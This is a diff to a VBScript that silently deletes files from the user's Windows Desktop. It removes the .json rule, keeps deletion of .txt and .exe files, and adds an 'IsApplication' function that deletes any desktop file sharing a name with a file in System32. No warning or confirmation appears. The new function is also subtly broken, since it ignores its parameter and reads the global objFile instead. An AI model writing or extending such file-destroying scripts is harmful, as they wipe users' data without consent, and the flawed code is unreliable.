@@ -8,14 +8,30 @@ Set objFSO = CreateObject("Scripting.FileSystemObject")
 ' Get the Desktop folder
 Set objFolder = objFSO.GetFolder(WScript.CreateObject("WScript.Shell").SpecialFolders("Desktop"))
 
-' Loop through each file in the Desktop folder and delete if it has the .txt, .exe, or .json extension
+' Loop through each file in the Desktop folder and delete if it has the .txt, .exe, or is an application
 For Each objFile In objFolder.Files
     Dim extension
     extension = LCase(objFSO.GetExtensionName(objFile.Name))
-    If extension = "txt" Or extension = "exe" Or extension = "json" Then
+    If extension = "txt" Or extension = "exe" Or IsApplication(objFile) Then
         objFSO.DeleteFile(objFile)
     End If
 Next
+
+' Function to check if a file is an application
+Function IsApplication(file)
+    Dim objShell, objFolder, objFolderItem
+    Set objShell = CreateObject("Shell.Application")
+    Set objFolder = objShell.Namespace("C:\Windows\System32")
+    Set objFolderItem = objFolder.ParseName(objFile.Name)
+    If Not objFolderItem Is Nothing Then
+        IsApplication = True
+    Else
+        IsApplication = False
+    End If
+    Set objFolderItem = Nothing
+    Set objFolder = Nothing
+    Set objShell = Nothing
+End Function
 
 ' Release FileSystemObject resources
 Set objFile = Nothing
